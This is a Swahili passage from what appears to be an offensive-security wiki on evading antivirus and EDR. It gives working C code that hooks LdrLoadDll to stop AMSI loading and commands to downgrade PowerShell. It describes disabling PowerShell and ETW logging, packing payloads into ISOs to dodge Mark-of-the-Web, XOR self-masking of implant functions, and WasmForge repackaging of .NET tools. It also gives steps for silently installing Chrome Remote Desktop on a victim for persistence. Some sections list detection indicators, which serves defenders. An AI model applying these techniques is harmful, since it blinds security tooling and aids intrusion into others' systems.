Muhtasari wa utekelezaji (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Dokezo
- Hufanya kazi katika PowerShell, WScript/CScript na custom loaders kwa pamoja (chochote ambacho kingepakia AMSI).
- Iunganishe na kutuma scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka mabaki marefu ya command-line.
- Imeonekana ikitumiwa na loaders zinazoendeshwa kupitia LOLBins (kwa mfano, `regsvr32` kuita `DllRegisterServer`).

Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** pia hutengeneza script ya kukwepa AMSI.
Tool **[https://amsibypass.com/](https://amsibypass.com/)** pia hutengeneza script ya kukwepa AMSI bila kugunduliwa na signature, kwa kutumia randomized user-defined function, variables, character expression na kubadilisha nasibu ukubwa wa herufi za keywords za PowerShell.

**Ondoa signature iliyogunduliwa**

Unaweza kutumia tool kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** ili kuondoa signature ya AMSI iliyopo kwenye memory ya process ya sasa. Tool hii hufanya kazi kwa kuchanganua memory ya process ya sasa ili kutafuta signature ya AMSI, kisha kuibadilisha kwa instructions za NOP, na hivyo kuiondoa kwenye memory.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI kwenye **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia PowerShell version 2**
Ukitumia PowerShell version 2, AMSI haitapakiwa, kwa hiyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi:

```bash
powershell.exe -version 2
```

## Uwekaji Kumbukumbu wa PS

Uwekaji kumbukumbu wa PowerShell ni kipengele kinachokuwezesha kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kusaidia katika ukaguzi na utatuzi wa matatizo, lakini pia inaweza kuwa **tatizo kwa washambuliaji wanaotaka kukwepa kutambuliwa**.

Ili kukwepa uwekaji kumbukumbu wa PowerShell, unaweza kutumia mbinu zifuatazo:

- **Zima PowerShell Transcription na Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa kusudi hili.
- **Tumia PowerShell version 2**: Ukitumia PowerShell version 2, AMSI haitapakiwa, kwa hivyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Tumia kipindi cha PowerShell kisichodhibitiwa (unmanaged)**: Tumia [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kupangisha PowerShell bila kuwasha `powershell.exe` (mbinu inayotumiwa na `powerpick` ya Cobalt Strike). Hii hukwepa vidhibiti vinavyohusishwa mahususi na mchakato wa `powershell.exe`, lakini haizimi moja kwa moja AMSI, Script Block Logging, au kila ulinzi mwingine wa PowerShell; kiwango cha ulinzi hutegemea runtime na utekelezaji wa host.


## Obfuscation

> [!TIP]
> Mbinu kadhaa za obfuscation hutegemea kusimba data kwa njia fiche, jambo linaloongeza entropy ya binary na kurahisisha AV na EDR kuitambua. Kuwa mwangalifu kuhusu hili, na ikiwezekana tumia usimbaji kwa njia fiche kwenye sehemu mahususi tu za code yako ambazo ni nyeti au zinahitaji kufichwa.

### Kuondoa Obfuscation kwenye Binaries za .NET Zilizolindwa na ConfuserEx

Unapochanganua malware inayotumia ConfuserEx 2 (au forks za kibiashara), ni kawaida kukutana na tabaka kadhaa za ulinzi zinazozuia decompilers na sandboxes. Mchakato ulio hapa chini hurejesha kwa uhakika **IL iliyo karibu na ya awali**, ambayo baadaye inaweza ku-decompile kuwa C# kwa kutumia zana kama dnSpy au ILSpy.<sup>[[10]](#references)</sup>

1.  Kuondoa ulinzi dhidi ya kuchezewa (anti-tampering) – ConfuserEx husimba kila *method body* kwa njia fiche na kuifungua ndani ya static constructor ya *module* (`<Module>.cctor`). Pia hubadilisha checksum ya PE ili mabadiliko yoyote yaangushe binary. Tumia **AntiTamperKiller** kutafuta jedwali za metadata zilizosimbwa kwa njia fiche, kurejesha funguo za XOR na kuandika upya assembly safi:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output ina vigezo 6 vya anti-tamper (`key0-key3`, `nameHash`, `internKey`) ambavyo vinaweza kuwa muhimu unapotengeneza unpacker yako mwenyewe.

2.  Urejeshaji wa alama / mtiririko wa udhibiti – pitisha faili *safi* kwa **de4dot-cex** (fork ya de4dot inayotambua ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – chagua profile ya ConfuserEx 2
     • de4dot itabatilisha control-flow flattening, kurejesha namespaces, classes na majina ya variables ya awali, na kusimbua strings za constants.

3.  Proxy-call stripping – ConfuserEx hubadilisha method calls za moja kwa moja na wrappers nyepesi (pia huitwa *proxy calls*) ili kufanya decompilation iwe ngumu zaidi.  Ziondoe kwa kutumia **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Baada ya hatua hii unapaswa kuona .NET API za kawaida kama `Convert.FromBase64String` au `AES.Create()` badala ya functions za wrapper zisizoeleweka (`Class8.smethod_10`, …).

4.  Usafishaji wa mikono – endesha binary inayotokana na hatua hii ndani ya dnSpy, tafuta blob kubwa za Base64 au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata payload *halisi*. Mara nyingi malware huihifadhi kama byte array iliyosimbwa kwa TLV na kuanzishwa ndani ya `<Module>.byte_0`.

Mfululizo huu wa hatua hurejesha mtiririko wa utekelezaji **bila** kuhitaji kuendesha sample hasidi – jambo linalofaa unapofanya kazi kwenye workstation isiyo na muunganisho wa mtandao.

> 🛈  ConfuserEx hutengeneza attribute maalum inayoitwa `ConfusedByAttribute` ambayo inaweza kutumika kama IOC kupanga samples kiotomatiki.

#### Amri ya mstari mmoja
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya open-source ya LLVM compilation suite inayoweza kuongeza usalama wa software kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na kuzuia mabadiliko.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuzalisha code iliyofichwa wakati wa compile, bila kutumia tool yoyote ya nje na bila kurekebisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Ongeza safu ya operations zilizofichwa zinazozalishwa na C++ template metaprogramming framework, ambayo itafanya iwe vigumu zaidi kwa mtu anayetaka ku-crack application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza kuficha aina mbalimbali za pe files, zikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni engine rahisi ya metamorphic code kwa executables za aina yoyote.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni framework ya code obfuscation yenye udhibiti wa kina kwa lugha zinazoungwa mkono na LLVM, kwa kutumia ROP (return-oriented programming). ROPfuscator huficha program katika kiwango cha assembly code kwa kubadilisha instructions za kawaida kuwa ROP chains, na hivyo kuvuruga dhana yetu ya kawaida kuhusu control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzipakia

### LLVM compiler-assisted per-function self-masking

Badala ya kuficha implant nzima inapokuwa imelala tu, LLVM X86 backend iliyorekebishwa inaweza kuweka functions zilizochaguliwa zikiwa zimefichwa kwa XOR kila zinapokuwa hazitumiki. Function Peekaboo PoC huchagua majina yaliyotolewa mangling yenye `REG_`, huingiza stubs za kuingia/kutoka zisizotegemea mahali karibu na machine code ya mwisho, na kutoa masking handler moja ya pamoja katika `.text`; signatures za kiwango cha source na Windows x64 calling convention hubaki bila kubadilika.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Hii inapaswa kufanyika baada ya instruction selection na optimization kwa sababu transformation lazima ihusishe **kila return inayotolewa** na ijue mpangilio halisi wa x86. `MachineFunctionPass` ya kabla ya emission hutafuta `MachineInstr::isReturn()` ya mwisho, huifuta ili njia ya mwisho ipitie hadi kwenye epilogue iliyoongezwa, na hubadilisha returns za awali kuwa `JMP_1 handler`. Acha stack/frame teardown yoyote iliyozalishwa na compiler kabla ya kila return; elekeza upya instruction ya return pekee.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` na `emitFunctionBodyEnd()` hutoa stubs za kila function, huku `emitEndOfAsmFile()` ikitoa handler. Symbols zinazoshirikiwa kati ya hatua za emission huruhusu tawi la prologue kulenga epilogue yake inayofuata; kwa `je` ya karibu inayotolewa mwenyewe, andika `0F 84` ikifuatiwa na MC expression ya byte nne `target - address_after_je`. Calls na jumps kwenda kwa handler badala yake zinaweza kutolewa kama objects za `MCInst` (`CALL64pcrel32` na `JMP_1`). Pass lazima irudishe `false` kwa function ambayo haikuchaguliwa ikiwa haikubadilisha chochote; PoC hurudisha `true` kimakosa katika hali hiyo.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoC huweka XOR key na records za byte 16 zenye function pointer iliyorekebishwa na loader pamoja na runtime length katika `.funcmeta`. Ingawa field ya C ni `uint32_t`, handler husoma QWORD kwenye offset `+8` ya record, ikitumia length pamoja na padding yake, na husogeza records kwa `0x10`. Majina ya PE section yana urefu wa byte nane tu, kwa hiyo utafutaji wa runtime huona `.funcmet`. Patcher ya nje huongeza `.stub` inayoweza kutekelezwa, huhifadhi RVA ya entry point ya awali ndani ya stub, na kuelekeza upya `AddressOfEntryPoint`; PIC stub hupata image base kutoka `gs:[0x60]` → `[PEB+0x10]`, hupitia imports za PE32+ ili kutatua `VirtualProtect` ambayo tayari imeimportiwa, na huendeshwa kabla ya CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Initialization huweka sentinel katika `gs:[0xE8]` na kuita kila function ya metadata. Prologue yake inayosomeka daima huweka mwanzo wa function katika `gs:[0xF0]`, hutambua sentinel, na kuruka body ambayo bado haijafichwa. Kisha epilogue hutumia `call handler`; baada ya handler kuhifadhi registers 13 (`0x68` bytes), anwani ya kurudi katika `[rsp+0x68]` huwa mwisho wa function iliyobadilishwa, kwa hiyo `end - start` inaweza kuandikwa kwenye record yake ya metadata. Stub huondoa sentinel na kuruka hadi `ImageBase + original_entry_point_RVA` baada ya bodies zote kufichwa.<sup>[[38]](#references)[[39]](#references)</sup>

Wakati wa call ya kawaida, prologue huita handler yuleyule ili kufungua body. Njia ya mwisho hupitia hadi kwenye epilogue iliyoongezwa, huku kila return ya awali ikiruka moja kwa moja hadi kwa handler ya pamoja. Epilogue ya kawaida pia hutumia `jmp handler` badala ya `call`, kwa hiyo baada ya kuficha tena, `ret` ya handler hutumia anwani ya kurudi ya caller wa awali na kuhifadhi matokeo ya function katika `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Handler hupata record ya sasa, huruka prologue inayoonekana yenye urefu usiobadilika (`0x46` bytes katika build hii), hubadilisha sehemu iliyobaki kuwa `PAGE_EXECUTE_READWRITE`, huifanyia XOR byte kwa byte kwa kutumia byte ya chini ya key, kisha huiweka kuwa `PAGE_EXECUTE_READ`. Kwa hiyo loop hiyo hiyo hufungua code wakati wa kuingia na kuificha tena kila inapotoka kawaida.<sup>[[38]](#references)[[39]](#references)</sup>

Viashiria muhimu vya muundo huu ni pamoja na:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point ndani ya `.stub` inayoweza kutekelezwa na section ya `.funcmet` yenye key pamoja na pointers za `.text` zilizorekebishwa;
- uchanganuzi wa PEB, import-table na section-table kabla ya CRT, kisha calls kupitia kila pointer ya metadata;
- PIC prologues zinazofanana za `call`/`pop` na return sites nyingi zinazoelekezwa upya kwa handler mmoja;
- writes kwenye `gs:[0xE8]`, `gs:[0xF0]`, na `gs:[0xF8]` zikifuatiwa na mabadiliko yanayojirudia ya `VirtualProtect` na writes za XOR byte kwa byte kwenye executable pages zinazotegemea image.

Huu ni ukwepaji wa memory scanner, si ulinzi wa kriptografia: file iliyopachikwa bado ina body ya awali iliyo wazi, na debugger inaweza kuweka breakpoint kwenye `VirtualProtect` au XOR loop na kutoa dump ya function inayotumika. XOR ya byte moja, metadata inayosomeka, na mpaka usiobadilika wa `0x46` pia hurahisisha recovery ya offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slots za PoC ni za kila thread, lakini code pages zilizorekebishwa ni za process nzima. Kwa hiyo kuingia kwa wakati mmoja au kwa kujirudia kunaweza kubadilisha instructions tena wakati invocation nyingine bado inatekelezwa; exceptions na nonlocal exits pia zinaweza kuruka hatua ya kuficha tena. Implementation imara lazima isawazishe mabadiliko, irejeshe protection iliyorejeshwa kupitia `lpflOldProtect`, iepuke urefu wa stub uliowekwa kwa namba isiyobadilika, ikague njia za `call` na `jmp` kwa stack alignment ya x64, na iite `FlushInstructionCache` baada ya kuandika upya bytes zinazoweza kutekelezwa. Microsoft inabainisha wazi kuwa caller ndiye anayewajibika kwa instruction-cache coherency wakati executable code inarekebishwa.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Huenda umewahi kuona skrini hii unapopakua baadhi ya executables kutoka kwenye intaneti na kuziendesha.

Microsoft Defender SmartScreen ni utaratibu wa usalama uliokusudiwa kumlinda mtumiaji wa mwisho dhidi ya kuendesha applications zinazoweza kuwa hasidi.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen hutumia hasa mbinu inayotegemea sifa ya faili, kumaanisha kwamba applications ambazo hazipakuliwi mara nyingi zitasababisha SmartScreen kutoa tahadhari na kumzuia mtumiaji wa mwisho kuendesha faili (ingawa faili bado inaweza kuendeshwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) inayoitwa Zone.Identifier, ambayo huundwa kiotomatiki faili zinapopakuliwa kutoka kwenye intaneti, pamoja na URL ilikopakuliwa kutoka.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Ukaguzi wa Zone.Identifier ADS ya faili iliyopakuliwa kutoka kwenye intaneti.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kwamba executables zilizosainiwa kwa cheti cha kusaini **kinachoaminika** **hazitasababisha SmartScreen kutoa tahadhari**.

Njia yenye ufanisi mkubwa ya kuzuia payloads zako kupata Mark of The Web ni kuzipakia ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwenye volumes **zisizo za NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni tool inayopakia payloads kwenye output containers ili kukwepa Mark-of-the-Web.

Mfano wa matumizi:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Huu hapa mfano wa kukwepa SmartScreen kwa kufungasha payloads ndani ya faili za ISO ukitumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni utaratibu madhubuti wa kurekodi kumbukumbu katika Windows unaoruhusu programu na vipengele vya mfumo **kurekodi matukio**. Hata hivyo, bidhaa za usalama pia zinaweza kuutumia kufuatilia na kutambua shughuli hasidi.

Kama vile AMSI inavyoweza kuzimwa (kukwepwa), inawezekana pia kufanya kazi ya **`EtwEventWrite`** ya mchakato wa user space irudi mara moja bila kurekodi matukio yoyote. Hili hufanywa kwa kubandika kazi hiyo kwenye kumbukumbu ili irudi mara moja, hivyo kuzima urekodi wa ETW kwa mchakato huo.

Unaweza kupata maelezo zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) na [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Kupakia binaries za C# kwenye kumbukumbu kumejulikana kwa muda mrefu, na bado ni njia nzuri sana ya kuendesha zana zako za post-exploitation bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye kumbukumbu bila kugusa diski, tutahitaji tu kuwa na wasiwasi kuhusu kubandika AMSI kwa mchakato mzima.

Framework nyingi za C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, n.k.) tayari zina uwezo wa kutekeleza C# assemblies moja kwa moja kwenye kumbukumbu, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Hii huhusisha **kuanzisha mchakato mpya wa kutumika mara moja**, kuingiza msimbo hasidi wa post-exploitation kwenye mchakato huo mpya, kutekeleza msimbo huo, kisha kuua mchakato mpya baada ya kumaliza. Njia hii ina faida na hasara zake. Faida ya mbinu ya Fork&Run ni kwamba utekelezaji hufanyika **nje ya** mchakato wa implant yetu ya Beacon. Hii ina maana kwamba ikiwa hitilafu itatokea katika hatua ya post-exploitation au ikigunduliwa, kuna **uwezekano mkubwa zaidi** wa **implant yetu kunusurika**. Hasara yake ni kwamba kuna **uwezekano mkubwa zaidi** wa kugunduliwa na **utambuzi wa kitabia**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Hii huhusu kuingiza msimbo hasidi wa post-exploitation **kwenye mchakato wake wenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kufanyiwa uchunguzi na AV, lakini hasara yake ni kwamba hitilafu ikitokea wakati wa kutekeleza payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwa sababu mchakato unaweza kuanguka.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa ungependa kusoma zaidi kuhusu upakiaji wa C# Assembly, angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na BOF yao ya InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**; angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [video ya S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Kufungasha upya zana za .NET kuwa NativeAOT WebAssembly (WasmForge)

Mbinu za kawaida za `execute-assembly` huhifadhi MSIL inayotambulika na hatimaye kuanzisha CLR. **WasmForge** hubadilisha msingi wa utekelezaji: huhamisha mradi wa C# hadi kwenye lengo la majaribio la NativeAOT-LLVM WASI, huukompaili mapema kuwa WebAssembly, na hupachika moduli hiyo ndani ya mwenyeji wa Windows PE anayetumia Wazero. Mchakato unaotokana na hilo hauhitaji CLR, JIT, au mwenyeji wa `dotnet` wa mashine lengwa, kwa hiyo sheria zinazotegemea tu majina ya managed assembly, upakiaji wa CLR, AMSI, au .NET ETW hupoteza mwonekano wa moja kwa moja. Hii ni mbinu ya kukwepa/fungasha, si kukwepa mpaka wa ruhusa—guest hubaki na ruhusa za zana ya awali na tabia ya OS inayoweza kuonekana.<sup>[[44]](#references)[[45]](#references)</sup>

### Kuunda mradi wa C#

Njia inayopendekezwa ya build ni kutumia mazingira ya Docker ya mradi kwa sababu yanajumuisha .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker, na vitegemezi vya kusaini. Faili ya `.csproj` hugunduliwa kiotomatiki; build ya hatua moja hufanya uhamishaji, marekebisho ya uoanifu, ukompaili wa WASM, uundaji wa PE, na usainishaji.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Kwa utatuzi wa matatizo au ukaguzi wa code iliyozalishwa, gawanya mchakato katika `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm`, na hatua ya mwisho `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Picha ya build pia hutumia wrapper ya `wasm-component-ld` ili kuepuka usimbaji wa component wa WASI Preview 2 na kutoa module ya kawaida inayotarajiwa na runtime iliyopachikwa.<sup>[[44]](#references)[[45]](#references)</sup>

### Kuunganisha wasm32 C# na x64 Win32

Huu si mchakato wa recompilation unaofanyika bila mabadiliko. NativeAOT-WASI haina baadhi ya vipengele vya BCL vinavyoelekezwa kwa Windows au hubadilisha jinsi vinavyofanya kazi, na kwa kawaida guest ya wasm32 hutenga nafasi za pointer za baiti nne ilhali API za x64 zinaweza kurudisha pointer za baiti nane. WasmForge hushughulikia matatizo yote mawili kwa kutumia tabaka hizi zinazozalishwa:<sup>[[44]](#references)</sup>

1. Source patcher hurekebisha tofauti za kisemantiki mahususi kwa AOT na kuelekeza upya miito isiyotumika ya registry, pipes, WMI, identity, directory-service, file-version, LSA na mingine inayofanana kwenda kwa helpers za `Wf*`.
2. P/Invoke scanner huzalisha mappings za NativeAOT `DirectPInvoke` ili miito ya `[DllImport]` iunganishwe na alama za C bridge zilizounganishwa badala ya kupakia DLL iliyotajwa ndani ya guest kwa njia ya dynamic.
3. Pointer zinazotumika kwenye host hutumia `ulong` katika C# na `uint64_t` katika C. Dispatcher ya jumla hupeleka miito kwa handler ya Win32 ya host; `out8_mask` huashiria nafasi halisi za matokeo za baiti nane ambazo sehemu zake za juu lazima zihifadhiwe. Matokeo ya umbo la wasm32 yasiyo na alama hutumia ulinzi wa snapshot/restore ili maandishi ya x64 yasiharibu baiti nne zilizo karibu.
4. Host bridges mahususi hushughulikia shughuli zisizolingana na dispatch ya jumla ya syscall, kama vile ufikiaji wa LSA ticket-cache, shughuli za Kerberos/BCrypt zenye matokeo yaliyopangwa, trafiki ya TCP KDC, na maswali ya LDAP.

Kwa mfano, wrapper ya `version.dll!VerQueryValueW` hupitisha anwani nne za host na kuweka biti za 2 na 3 (`0xC`) kwa sababu pointer ya thamani na urefu wake ni nafasi za matokeo za baiti nane. Wrapper yenyewe hubaki ya jumla na hukabidhi jina la DLL, jina la export, argumenti na mask kwa `wf_call_v2`; host hutafsiri pointer na kuita API asilia.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Vikwazo na viashiria vya kubadili mwelekeo wa ugunduzi

Msimbo unaotumia sana Reflection, upakiaji wa dynamic assembly, arbitrary native callbacks, na miundo changamano ya x64 inayorejeshwa kwenye WASM memory bado unaweza kuhitaji marekebisho maalum kwa kila tool au kushindwa kabisa. Sockets za kawaida za WASI Preview 2 pia zinaweza kufikia no-op stubs, kwa hivyo tools zinazoungwa mkono hutumia host shims maalum kwa kila protocol. Thibitisha kila command dhidi ya native build badala ya kudhani kuwa vipengele vyote vinafanya kazi sawa.<sup>[[44]](#references)[[45]](#references)</sup>

Mbinu hii huhamisha telemetry badala ya kufanya payload isionekane. Ugunduzi unaweza kuelekezwa kwenye PE iliyo na au inayounda WASM module, tabia inayofanana na Wazero runtime, ugawaji na unakili wa memory usio wa kawaida kati ya host na guest, uelekezaji wa jumla wa Win32 wa moja kwa moja, hitilafu za signing na PE resources, pamoja na API calls na network traffic zinazotokana na hilo. Kwa hivyo, kutokuwepo kwa matukio ya CLR-load, AMSI, au .NET ETW hakupaswi kuchukuliwa kuwa ushahidi kwamba mchakato hauna madhara.<sup>[[44]](#references)</sup>

## Kutumia Lugha Nyingine za Kuprogramu

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza msimbo hasidi kwa kutumia lugha nyingine kwa kuipa mashine iliyoathiriwa ufikiaji wa **mazingira ya interpreter yaliyosakinishwa kwenye SMB share inayodhibitiwa na Attacker**.

Kwa kuruhusu ufikiaji wa Interpreter Binaries na mazingira yaliyopo kwenye SMB share, unaweza **kutekeleza msimbo wowote wa lugha hizi ndani ya memory** ya mashine iliyoathiriwa.

Repo inaeleza: Defender bado huchanganua scripts, lakini kwa kutumia Go, Java, PHP n.k. tunapata **unyumbufu zaidi wa kukwepa static signatures**. Majaribio ya kutumia reverse shell scripts za nasibu, zisizofichwa kwa obfuscation, katika lugha hizi yamefanikiwa.

## Kukaribisha tena WebAssembly ili kukwepa static analysis

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping hubadilisha access token ya bidhaa ya usalama kama vile EDR au AV. Kupunguza ruhusa za token kunaweza kuacha mchakato ukiendelea huku kukizuia kufanya ukaguzi au hatua za urekebishaji zinazohitaji ruhusa za juu.

Ili kuzuia hili, Windows inaweza **kuzuia michakato ya nje** kupata handles za tokens za michakato ya usalama.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Kutumia Software Inayoaminika

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**chapisho hili la blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi kusakinisha Chrome Remote Desktop kwenye PC ya mwathiriwa na kisha kuitumia kuichukua udhibiti na kudumisha persistence:<sup>[[35]](#references)</sup>
1. Pakua kutoka https://remotedesktop.google.com/, bofya "Set up via SSH", kisha ubofye faili ya MSI ya Windows ili kuipakua.
2. Endesha kisakinishi bila kuonyesha ujumbe kwenye mashine ya mwathiriwa (ruhusa za admin zinahitajika): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na ubofye next. Kisha wizard itakuomba uidhinishe; bofya kitufe cha Authorize ili kuendelea.
4. Tekeleza command uliyopewa baada ya kufanya marekebisho yanayohitajika: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parameter ya `--pin` huweka PIN bila kutumia GUI).
 

## Ukwepaji wa Juu

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Ukwepaji ni mada ngumu sana; wakati mwingine unapaswa kuzingatia vyanzo vingi tofauti vya telemetry kwenye mfumo mmoja, kwa hiyo ni vigumu sana kubaki bila kugunduliwa kabisa katika mazingira yaliyokomaa.

